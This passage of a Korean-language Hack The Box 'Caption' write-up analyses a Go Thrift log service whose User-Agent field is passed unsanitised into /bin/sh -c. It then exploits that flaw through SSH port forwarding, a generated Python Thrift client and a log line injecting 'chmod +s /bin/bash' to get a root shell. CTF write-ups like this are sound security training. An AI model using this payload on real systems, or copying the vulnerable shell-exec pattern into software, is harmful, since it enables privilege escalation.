        logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
        exec.Command{"/bin/sh", "-c", logs}
    }
    return "Log file processed",nil
}
  
func main() {
    handler := &LogServiceHandler{}
    processor := log_service.NewLogServiceProcessor(handler)
    transport, err := thrift.NewTServerSocket(":9090")
    if err != nil {
        log.Fatalf("Error creating transport: %v", err)
    }
  
    server := thrift.NewTSimpleServer4(processor, transport, thrift.NewTTransportFactory(), thrift.NewTBinaryProtocolFactoryDefault())
    log.Println("Starting the server...")
    if err := server.Serve(); err != nil {
        log.Fatalf("Error occurred while serving: %v", err)
    }
}
```

코드를 살펴보면 `github.com/apache/thrift/lib/go/thrift` 패키지를 `import` 하고 있는 것을 확인할 수 있으며,
이를 통해 해당 서비스가 **Apache Thrift 기반 RPC 서버**로 구현 되어 있음을 알 수 있다.

또한 `main()` 함수에서 다음과 같이 `9090` 포트에서 Thrift 서버를 실행하는 것을 확인할 수 있다:

```go
transport, err := thrift.NewTServerSocket(":9090")
```

즉, 시스템 내부에서 `9090` 포트로 **Thrift 서비스가 동작하고 있음**을 알 수 있다.

이후 코드를 살펴보면 로그 파일의 각 라인을 읽으면서 정규식을 이용해 IP 주소와 `User-Agent` 값을 추출한 후 각각 변수에 저장하고, 이를 `output.log` 파일에 기록하는 것을 확인할 수 있다:

```go
ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
outputFile, err := os.Create("output.log")
```

가장 중요한 부분은 다음과 같다:

```go
for scanner.Scan() {
    line := scanner.Text()
    ip := ipRegex.FindString(line)
    userAgentMatch := userAgentRegex.FindStringSubmatch(line)
    var userAgent string
    if len(userAgentMatch) > 1 {
        userAgent = userAgentMatch[1]
    }
    timestamp := time.Now().Format(time.RFC3339)
    logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
    exec.Command{"/bin/sh", "-c", logs}
}
```

우선 로그 파일에서 한 줄씩 읽은 후 **ipRegex 정규식**을 이용해 IP 주소 형태의 문자열을 찾아 `ip` 변수에 저장한다:

```go
ip := ipRegex.FindString(line)
```

이후 `"user-agent"` 필드를 추출하기 위해 `userAgentRegex` 정규식을 사용한다.

`FindStringSubmatch()` 함수는 정규식과 일치하는 값을 배열 형태로 반환하며, 이 중 `"user-agent"` 값은  `userAgentMatch[1]` 에 저장되며 해당 값은 `userAgent` 변수에 할당된다:

```go
userAgentMatch := userAgentRegex.FindStringSubmatch(line)
  var userAgent string
  if len(userAgentMatch) > 1 {
      userAgent = userAgentMatch[1]
  }
```


이후 `logs` 변수를 생성하면서 `fmt.Sprintf()` 를 통해 문자열을 구성하고, 각 `%s` 위치에 `ip`, `userAgent`, `timestamp` 값이 삽입된다:

```go
logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
```

이 문자열은 `/bin/sh -c` 를 통해 실행되도록 작성되어 있다:

```go
exec.Command{"/bin/sh", "-c", logs}
```

마지막으로 `ReadLogFile` 함수의 인자를 살펴보면 다음과 같다:

```go
func (l *LogServiceHandler) ReadLogFile(ctx context.Context, filePath string) (r string, err error) {
// SKIP
}
```

`filePath` 값은 외부에서 전달되는 값이며, 별도의 검증 없이 그대로 `os.Open()` 에 사용된다:

```go
file, err := os.Open(filePath)
```

## Command Injection Vulnerability

정리하면 `ReadLogFile` 함수의 인자인 `filePath` 값은 외부에서 전달되며, 별도의 검증 없이 `os.Open()` 에 사용된다.  

따라서 공격자는 서비스가 읽을 로그 파일 경로를 임의로 지정할 수 있다.

또한 `userAgentRegex`에 정의된 정규식(`"user-agent":"([^"]+)"`)을 자세히 살펴보면 `"user-agent":"` 이후의 문자열 중 다음 큰따옴표(`"`)가 나오기 전까지의 모든 값을 추출하게 된다.

다음과 같은 `User-Agent` 값을 포함한 로그를 생성할 수 있다:

```text
"user-agent":"test'; <shell command> #"
```

이 값이 `userAgent` 변수에 저장된 후 `fmt.Sprintf()` 를 통해 다음과 같은 명령 문자열이 생성된다:

```bash
echo 'IP Address: , User-Agent: test'; <shell command> # 이후 주석처리 , Timestamp: <timestamp>' >> output.log
```

여기서 `test'` 부분의 작은따옴표(`'`)가 기존 **echo 문자열을 종료**시키게 되며, 이후 등장하는 `<shell command>` 는 새로운 명령으로 해석되어 실행된다.

따라서 최종적으로 `/bin/sh -c` 가 실행될 때 공격자가 삽입한 `<shell command>` 가 실행되면서 **Command Injection**이 발생한다.

## Local Port Forwarding

내부에서만 접근 가능한 `9090` 포트의 서비스에 접근하기 위해 SSH 로컬 포트 포워딩을 수행하였다:

```bash
$ ssh -i id_ecdsa -L 9090:localhost:9090 margo@caption.htb
```

이를 통해 로컬 환경에서 `localhost:9090` 을 통해 원격 시스템의 Thrift 서비스에 접근할 수 있게 된다.

## Command Injection Exploitation

공격에 사용할 Thrift 클라이언트를 작성하기 위해 `LogService` 레포지토리에 포함된 `log_service.thrift` 파일을 로컬 환경으로 다운로드하였다.

먼저 Python에서 Thrift 클라이언트를 사용하기 위해 관련 라이브러리를 설치하였다:

```bash
$ pip install thrift
```

이후 `thrift` 명령어를 사용하여 Python 클라이언트 코드를 생성하였다:

```bash
$ thrift --gen py log_service.thrift
```

명령을 실행하면 `gen-py` 디렉토리가 생성되며, 이 디렉토리 내부에 Thrift 클라이언트 코드가 생성된다:

```bash
$ ls -l

-rw-rw-r-- 1 kali kali    0 Mar 14 06:16 __init__.py
drwxrwxr-x 2 kali kali 4096 Mar 14 06:16 log_service
```

이후 `ReadLogFile` 함수를 호출하기 위한 Python 클라이언트를 작성하였다:

```python
import sys
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol

from log_service import LogService

transport = TSocket.TSocket('127.0.0.1', 9090)
transport = TTransport.TBufferedTransport(transport)
protocol = TBinaryProtocol.TBinaryProtocol(transport)

client = LogService.Client(protocol)

transport.open()

print(client.ReadLogFile("/tmp/payload.log"))

transport.close()
```

위 파일을 `payload.py` 파일로 저장 시킨후, `margo` 사용자 셸에서 `/tmp` 디렉토리에 공격에 사용할 로그 파일을 생성하였다:

```bash
margo@caption:/tmp$ cat payload.log

"user-agent":"test'; chmod +s /bin/bash #"
```

이후 `payload.py` 를 실행하면 다음과 같은 메시지가 출력된다:

```bash
$ python3 payload.py

Log file processed
```

명령 실행 이후 `/bin/bash` 파일의 권한을 확인하면 SUID 비트가 설정된 것을 확인할 수 있다:

```bash
margo@caption:/tmp$ ls -l /bin/bash

-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

이후 SUID 권한이 설정된 `bash` 를 실행하면 root 권한의 셸을 획득할 수 있다:

![Caption](/assets/htb-linux/caption/root-shell.png)

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![Caption](/assets/htb-linux/caption/flag.png)
























